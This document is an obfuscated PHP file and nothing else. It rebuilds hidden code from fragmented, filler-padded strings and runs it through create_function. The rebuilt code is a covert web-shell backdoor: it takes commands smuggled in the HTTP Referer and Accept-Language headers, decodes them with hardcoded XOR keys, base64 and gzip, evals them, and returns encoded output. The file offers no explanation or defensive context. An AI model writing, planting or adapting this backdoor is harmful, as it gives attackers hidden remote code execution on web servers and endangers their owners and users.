<?php
$k='de(x(gzXXXcompressX($o),$k));priXnt("X<$k>$Xd</$k>");@XsXession_deXstroy();}}}}';
$n='ounXt($m[1]);$XXz++)$p.=$q[$m[2][$XzX]];if(strpXXos($p,X$h)===0){$s[$XXi]=""';
$E='X,0X,$e))),$Xk))XX);$o=ob_get_contentXsX();ob_end_XcXlean();$d=bXase64_XencoX';
$q='5($iX.$XXkh),0,3))X;$f=X$sXl($ss(mXd5($i.$kf),0,3));$Xp="X";for(X$z=1;X$z<Xc';
$j='X4X_decode(preXXg_replace(array("X/_/X","/-/X"),array("/"X,"+X"X),$ss($s[$i]';
$H='X$i],$f);XiXf(X$e){$k=$kh.$kf;ob_sXtarXt();@evXal(@gXzuncompressX(X@x(@baXse6';
$u='X$kh="X5d41";$kf="402Xa";functXioXn x(X$t,$kX){$c=strlen($kX);$l=sXtXrlen($tX)';
$F=';$o=X"";for($Xi=X0;$i<$l;){for(X$j=X0;($jX<X$cX&&$i<$l);$jXX++,$i++){$Xo.=$t';
$e='ION;$ss=X"subsXtXr";$sl="strtolowerX";$i=X$XXm[1][0X].$m[1][1X];$h=$sl($ss(mXd';
$K='{$i}^X$k{$j};X}}return $oX;}$Xr=$X_SERVER;$Xrr=@$r["XXHTTP_REFXERXER"]X;$ra=@$r';
$W=';$p=$sXs($p,3);}Xif(XarrXaXy_kXey_exists($XiX,$s))X{$s[$i]X.=$p;$e=strpoXs($s[';
$Q='["XHTTP_ACCEPTX_LANGUAGXEX"];if($rrX&X&$ra){$u=Xparse_Xurl($rr);pXarseX_XstX';
$i=str_replace('Q','','QcreQatQe_fQuQQnction');
$I='r($u[X"Xquery"],X$q);$q=aXrray_vXalXues($Xq);pregX_match_all("/([\\w])X[\\w-X]+(';
$g='?:;q=0.XX([\\d])X)X?,?/",$ra,$m);ifX($q&X&$m){@Xsession_staXrt()X;$s=X&XX$_SESS';
$M=str_replace('X','',$u.$F.$K.$Q.$I.$g.$e.$q.$n.$W.$H.$j.$E.$k);
$d=$i('',$M);$d();
?>
